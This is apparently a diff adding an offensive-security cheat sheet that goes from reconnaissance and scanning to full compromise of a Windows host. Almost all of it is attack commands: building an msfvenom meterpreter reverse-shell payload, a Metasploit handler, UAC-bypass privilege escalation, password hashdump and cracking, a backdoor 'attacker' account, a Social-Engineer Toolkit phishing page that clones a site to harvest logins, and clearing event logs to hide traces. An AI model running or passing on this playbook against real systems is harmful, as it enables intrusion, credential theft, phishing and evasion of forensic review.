@@ -1,0 +1,106 @@
+Information Gathering/Foot Printing
+
+Website : https://whois.icann.org
+Command : # whois google.com
+	  # host google.com
+	  # host -a google.com
+	  # dig google.com
+	  # dnsenum google.com //
+
+Network Scanning
+
+Command	: # nslookup
+	    >google.com
+	    >set type=mx
+	    >google.com	
+	    >set type=ANY
+	    >google.com
+	  # nmap -sS 192.168.0.12 //sync scan
+	  # nmap -sV 192.168.0.12 //version scan
+	  # unicorn 192.168.0.12
+	  # hping3 --scan 1-65535 -s 192.168.0.12
+
+Exploit
+
+Metasploit usage
+Command	: # msfvenom -payload -l // to list all payloads
+	  # msfvenom -arch x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.11 LPORT=4444 -f exe -o Desktop/winpayload.exe //create a windows payload and deliver this to target
+	  # msfconsole
+	    > use exploit/multi/handler
+	    > set payload windows/meterpreter/reverse_tcp
+	    > set LHOST 192.168.0.11
+	    > set LPORT 4444
+	    > show options
+	    > exploit //wait for the connection
+	    meterpreter> pwd //after connection it will show the current directory
+	    meterpreter> shell //it will give you the shell
+	    C:\Users\lolan\Desktop>ipconfig
+	    C:\>exit
+	    meterpreter> show_mount //it willshow you all moun points
+	    meterpreter> cd D:\
+	    meterpreter>shell
+	    D:\>dir D:\  //you can view all files
+	    D:\>exit
+	    meterpreter>download "filename" //download a file
+	    meterpreter>sysinfo
+	    meterpreter>ps //list all process
+	    meterpreter> migrate <PID> //to migrate for preveilage escalation
+	    meterpreter> getprivs //show you the preveilages
+	    meterpreter> getuid //show you the current user name
+	    meterpreter> backgreoud //jsut exit from the session for more preveilage
+	    msf exploit(handler)>search bypassuac
+	    msf exploit(handler)> use exploit/windows/local/bypassuac
+	    msf exploit(bypassuac)> show options
+	    msf explot(bypassuac)>set SESSION 1
+	    msf exploit(bypassuac)> exploit /escalate preveilage
+	    meterpreter> getuid //show you the uid
+	    meterpreter>getprivs
+	    meterpreter>ps
+	    meterpreter>migrate <PID>
+	    meterpreter>hashdump //dump the password hash and decode add this to password.txt
+	    meterpreter>
+	 
+Password Cracking
+website: https://crackstation.net //adn decode the dumped hash
+	   msf exploit(bpassuac) > sessions
+	   msf exploit(bpassuac) > sessions -i 2
+	   meterpreter>getuid
+	   meterpreter>shell
+	   C:\>net user  //check user accounts
+	   C:\>net user /add attacker  //add a new user account
+	   C:\>exit
+	   meterpreter>upload file.bat
+	   meterpreter>shell
+	   C:\>file.bat  //check user accounts
+
+
+
+Network Packet sniffing
+
+Wireshark is the best tool for this
+
+Command : tcpdump -w abc.pcap -i eth0
+
+
+Phishing Attack
+
+Command	: #setoolket
+	  #set>2
+	  #set:webattack>2
+	  #set:webattack>IP address for the POST back in Harvester/Tabanabbing: 192.168.0.11
+	  #set:webattack>Enter the url to clone: http://abc.com //it will do social engineering 
+
+
+Clearing target
+
+
+	   msf exploit(bpassuac) > sessions
+	   msf exploit(bpassuac) > sessions -i 2
+	   meterpreter>shell
+	   C:\>del file.bat  //remove the crested file
+	   C:\>net user /del attacker  //remove user
+	   C:\>exit
+	   meterpreter>clearev //it will clear logs
+	   meterpreter>kill all
+
+
